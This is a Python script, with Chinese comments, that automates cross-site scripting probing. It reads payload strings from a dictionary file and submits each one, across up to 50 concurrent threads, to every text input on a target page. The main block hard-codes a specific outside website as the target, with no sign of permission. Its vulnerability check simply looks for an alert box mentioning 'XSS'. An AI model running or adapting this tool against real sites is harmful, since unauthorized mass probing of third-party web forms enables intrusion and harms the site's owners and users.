import os
import time
import logging
import requests
from lxml import html
import linecache
import concurrent.futures
from urllib.parse import urlparse

def send_request(url, input_name, xss_code):
    # 发送包含 XSS 代码的 POST 请求
    data = {input_name: xss_code}
    response = requests.post(url, data=data)

    # 判断是否存在漏洞
    soup = html.fromstring(response.text)
    alert_box = soup.cssselect("div.alert-box")
    if alert_box and "XSS" in alert_box[0].text_content():
        message = f"Vulnerable input element found: {input_name} with XSS code: {xss_code}"
        logger.info(message)

def test_xss(url, xss_codes_file, max_workers=10):
    # 初始化日志记录器
    domain_name = urlparse(url).netloc.split(':')[0]
    log_file = f"{domain_name}_xss.log"
    logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    global logger
    logger = logging.getLogger(__name__)

    # 获取所有可输入元素
    response = requests.get(url)
    tree = html.fromstring(response.content)
    inputs = tree.xpath('//input[@type="text"] | //textarea')

    # 逐行读取包含 XSS 代码的文件，并去掉前后的双引号和逗号
    xss_codes = []
    with open(xss_codes_file, 'r') as f:
        for line in f:
            # 跳过注释行和空行
            if line.strip() and not line.startswith('#'):
                xss_code = line.strip()[1:-2]
                xss_codes.append(xss_code)

    logger.info(f"Starting XSS test on {url}")
    start_time = time.time()

    # 使用线程池，限制最大并发数量
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 为每个输入框创建一个线程，并尝试该输入框与 XSS 代码文件中的每一行组合成的一组键值对
        for input_element in inputs:
            for xss_code in xss_codes:
                # 提交任务到线程池
                executor.submit(send_request, url, input_element.name, xss_code)

    end_time = time.time()
    elapsed_time = end_time - start_time

    logger.info(f"XSS test completed in {elapsed_time:.2f} seconds")

if __name__ == "__main__":
    # 替换成你的目标网址
    url = "https://www.zuimh.com"

    # 生成包含常见 XSS 代码的文件
    file_path = "xss_dictionary.txt"

    # 测试 XSS 漏洞，设置最大线程数量为 50
    test_xss(url, file_path, max_workers=50)
